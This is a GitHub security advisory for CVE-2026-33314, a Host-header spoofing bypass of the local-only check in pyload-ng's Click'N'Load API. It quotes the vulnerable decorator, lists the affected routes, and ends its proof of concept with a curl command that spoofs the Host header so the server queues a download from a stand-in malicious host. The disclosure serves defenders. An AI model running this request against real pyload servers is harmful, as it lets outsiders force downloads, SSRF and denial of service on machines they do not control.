# [M] Improper Authentication and Origin Validation Error in pyload-ng

## Summary
Severity: Medium
Advisory: GHSA-q485-cg9q-xq2r
CVE: CVE-2026-33314
CWE: CWE-287, CWE-346
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L (CVSS_V3)
Published: 2026-03-19
Source: https://github.com/advisories/GHSA-q485-cg9q-xq2r
Type: github-advisory

## Affected
- PyPI: `pyload-ng` — affected >=0 <0.5.0b3.dev97

## Details
### Summary

A Host Header Spoofing vulnerability in the `@local_check` decorator allows unauthenticated external attackers to bypass local-only restrictions. This grants access to the Click'N'Load API endpoints, enabling attackers to remotely queue arbitrary downloads, leading to Server-Side Request Forgery (SSRF) and Denial of Service (DoS).

### Details

The `pyload` WebUI provides an API for the Click'N'Load plugin, which is intended to be accessed only from the local machine (e.g., via a browser extension sending requests to `localhost:9666`). To enforce this, the `pyload` application uses a `@local_check` decorator on the relevant routes in `src/pyload/webui/app/blueprints/cnl_blueprint.py`.

However, the `@local_check` implementation relies on the user-controlled `HTTP_HOST` (derived from the HTTP `Host` header) to verify the origin:

```python
# src/pyload/webui/app/blueprints/cnl_blueprint.py
def local_check(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        remote_addr = flask.request.environ.get("REMOTE_ADDR", "0")
        http_host = flask.request.environ.get("HTTP_HOST", "0")

        if remote_addr in ("127.0.0.1", "::ffff:127.0.0.1", "::1", "localhost") or http_host in (
                "127.0.0.1:9666",
                "[::1]:9666",
        ):
            return func(*args, **kwargs)
        else:
            return "Forbidden", 403
    return wrapper
```

Because `http_host` is read directly from the `Host` header of the HTTP request, an external attacker can easily spoof this header (e.g., `Host: 127.0.0.1:9666`). When this spoofed header is present, the condition `http_host in ("127.0.0.1:9666", ...)` evaluates to `True`, completely bypassing the IP address check (`remote_addr`) and granting access to the protected functions.

The affected routes are:

- `/flash/` and `/flash/<id>`
- `/flash/add`
- `/flash/addcrypted`
- `/flash/addcrypted2`
- `/flashgot` and `/flashgot_pyload`
- `/flash/checkSupportForUrl`

### PoC

1. Ensure the PyLoad instance is running and accessible externally.
2. Ensure the `ClickNLoad` plugin is enabled in the PyLoad settings (it evaluates to disabled by default).
3. Send a POST request to one of the protected endpoints, such as `/flash/add`, and spoof the `Host` header to `127.0.0.1:9666`.

Example `curl` command:

```bash
curl -i -X POST "http://<pyload-external-ip>:<port>/flash/add" \
     -H "Host: 127.0.0.1:9666" \
     -d "urls=http://malicious.com/payload.bin" \
     -d "package=MaliciousPackage"
```

4. Notice that you receive a `success\r\n` response instead of a `403 Forbidden`. The package and URL will be successfully added to the PyLoad queue.

### Impact

This vulnerability allows unauthenticated attackers to interact with the Click'N'Load API. Attackers can arbitrarily add URLs to the download queue, which forces the PyLoad server to make outbound requests to attacker-controlled or internal URLs (SSRF). Attackers can also exhaust the server's storage or bandwidth by queueing massive files (DoS).

## References
- https://github.com/pyload/pyload/security/advisories/GHSA-q485-cg9q-xq2r
- https://nvd.nist.gov/vuln/detail/CVE-2026-33314
- https://github.com/pyload/pyload
- https://github.com/pypa/advisory-database/tree/main/vulns/pyload-ng/PYSEC-2026-122.yaml
